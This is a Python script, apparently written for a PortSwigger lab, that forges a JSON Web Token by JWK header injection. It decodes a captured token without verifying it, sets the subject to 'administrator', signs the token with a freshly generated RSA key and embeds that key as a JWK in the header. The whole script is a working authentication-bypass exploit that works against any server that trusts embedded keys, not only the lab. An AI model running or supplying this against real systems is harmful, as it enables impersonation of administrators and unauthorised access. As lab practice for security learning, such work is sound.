import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Step 1: Generate an RSA key pair (for demo purposes; in practice, use existing keys or Burp's JWT Editor)
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Step 2: Take a JWT (replace with actual token from the lab)
token = "eyJraWQiOiI1ZjUyYjRjNC0yMWU1LTQzODMtYTg2NC0yOWY0YzZjM2Q2N2QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MDIxODI5MSwic3ViIjoid2llbmVyIn0.ZUidKbEK9gARUqUX3Zu2cSsBFgkFGXmEEtAJQASi-0nE5ydQNfL9bBHk-8QHlTL7nRDxaqgae9nES7tmjV-n-cQlD5mAxIxmb4GVTc4rbKh7pKeRuri19TIuDBNNsABa_Q615N9wL7wCdFGSuGQkWnYAn0CGWOEXGCAw07hChnfI2Q3nGO_GgEzYuWx0Ts0u7rb3ZpaSlt-xJ7-Y_LkUA9pbT5LJfnHGioKYN4z9EK7SFeJODZDV5JbtI3k44Mn69-KHWEu-1UJTb9RtvuJah5ZKcS2us4YWZmyWAP4GLKdOOOOl9gVyOukBl5-GsoNh2LaNdE1wp1qsoi83POqvZg"  # Obtain from lab's /my-account request

# Step 3: Decode the JWT (without signature verification to inspect contents)
try:
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    print(f"Decoded token: {decoded_token}")
    decoded_header = jwt.get_unverified_header(token)
    print(f"Decoded header: {decoded_header}\n")
except Exception as e:
    print(f"Error decoding token: {e}")
    exit(1)

# Step 4: Modify the token payload to set 'sub' to 'administrator'
decoded_token['sub'] = 'administrator'
print(f"Modified payload: {decoded_token}\n")

# Step 5: Create JWK from public key
public_numbers = public_key.public_numbers()
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(
        public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')
    ).rstrip(b'=').decode('utf-8'),
    "n": base64.urlsafe_b64encode(
        public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')
    ).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header.get('kid', 'default-kid')  # Retain original 'kid' or use a default
}

# Step 6: Sign the modified JWT with the private key and embed JWK in the header
try:
    modified_token = jwt.encode(
        decoded_token,
        private_key,
        algorithm='RS256',
        headers={'jwk': jwk, 'kid': decoded_header.get('kid', 'default-kid')}
    )
    print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")
    print(f"Final Token: {modified_token}")
except Exception as e:
    print(f"Error encoding token: {e}")
    exit(1)